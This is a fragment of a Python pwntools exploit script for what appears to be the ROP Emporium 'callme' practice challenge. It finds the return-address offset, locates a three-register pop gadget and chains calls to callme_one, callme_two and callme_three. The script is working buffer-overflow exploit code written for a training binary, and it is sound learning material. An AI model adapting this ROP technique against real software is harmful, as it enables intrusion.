
# Grab function symbols
callme_one = elf.symbols['callme_one'] # Grab location of function needed\
callme_two = elf.symbols['callme_two'] # Grab location of function needed\
callme_three = elf.symbols['callme_three'] # Grab location of function needed

# Print out target addresses
info("%#x callme_one", callme_one) # Print location of function needed\
info("%#x callme_two", callme_two) # Print location of function needed\
info("%#x callme_three", callme_three) # Print location of function needed

# Locate RIP value and offset
stack = core.rsp # Need to find what is before RIP
# Looks for the first 4 characters of the rsp to find the offset for RIP
pattern = core.read(stack,4) # Need to find what is before RIP and then add 4 to get RIP
# Finds RIP offset with pattern
rip_offset = cyclic_find(pattern) # New find for 64Bit

# Set up pwntools ROP chain
rop = ROP(elf) # Sets up ROP chain for exploit

# Find a gadget that pops 3 registers
pop3 = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"] )[0] # Gadget needed to pop 3 variables as needed

# Print ROP gadget's location
info("%#x ROP gadget", pop3) # Print gadget location

# Build the payload
payload = flat({
    rip_offset: [pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_one,
    pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_two,
    pop3,
    0xdeadbeefdeadbeef, 
    0xcafebabecafebabe, 
    0xd00df00dd00df00d,
    callme_three
    ]
})\
'''\
    rip_offset:         # Triggers BoF\
    [pop3,              # Instruction to pop next 3 variables\
    0xdeadbeefdeadbeef, # Variable 1\
    0xcafebabecafebabe, # Variable 2\
    0xd00df00dd00df00d, # Variable 3\
    callme_one,         # Function to jump to\
    pop3,               # Rinse and repeat for other functions\
    0xdeadbeefdeadbeef, \
    0xcafebabecafebabe, \
    0xd00df00dd00df00d,\
    callme_two,\
    pop3,\
    0xdeadbeefdeadbeef, \
    0xcafebabecafebabe, \
    0xd00df00dd00df00d,\
    callme_three\
'''\
